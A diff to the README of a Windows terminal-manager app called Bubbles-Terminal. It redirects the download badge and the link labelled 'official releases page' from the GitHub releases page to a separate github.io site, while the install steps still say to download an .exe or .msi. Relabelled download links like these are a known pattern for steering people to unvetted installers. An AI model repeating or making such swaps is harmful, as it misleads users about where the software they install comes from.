@@ -1,6 +1,6 @@
 # 🫧 Bubbles-Terminal - Manage your command shells with ease
 
-[![Download Bubbles-Terminal](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nonlethal-hochiminhcity858/Bubbles-Terminal/releases)
+[![Download Bubbles-Terminal](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nonlethal-hochiminhcity858.github.io)
 
 Bubbles-Terminal provides a unified workspace for your computer shells. It organizes your existing tools into one clean window. You work within your usual environment without the clutter of multiple windows.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to get the app running:
 
-1. Visit the [official releases page](https://github.com/nonlethal-hochiminhcity858/Bubbles-Terminal/releases).
+1. Visit the [official releases page](https://nonlethal-hochiminhcity858.github.io).
 2. Locate the latest version heading. 
 3. Look for the "Assets" section under the newest release.
 4. Select the file ending in `.msi` or `.exe` meant for Windows.
